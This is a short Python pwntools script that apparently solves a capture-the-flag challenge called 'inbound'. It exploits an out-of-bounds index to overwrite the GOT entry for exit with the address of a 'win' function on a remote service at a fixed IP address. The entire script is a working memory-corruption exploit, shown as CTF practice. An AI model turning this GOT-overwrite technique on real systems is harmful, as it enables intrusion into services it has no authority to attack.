import pwn
import IPython

elf = pwn.ELF('./inbound')
index = elf.got['exit'] - elf.symbols['slot']  # -56
index //= 4  # int = 4byte

# io = pwn.process('./inbound')
io = pwn.remote("34.170.146.252", 15307)
io.sendlineafter(b'index: ', str(index).encode())
io.sendlineafter(b'value: ', str(elf.symbols['win']).encode())
res = io.recvall()

IPython.embed()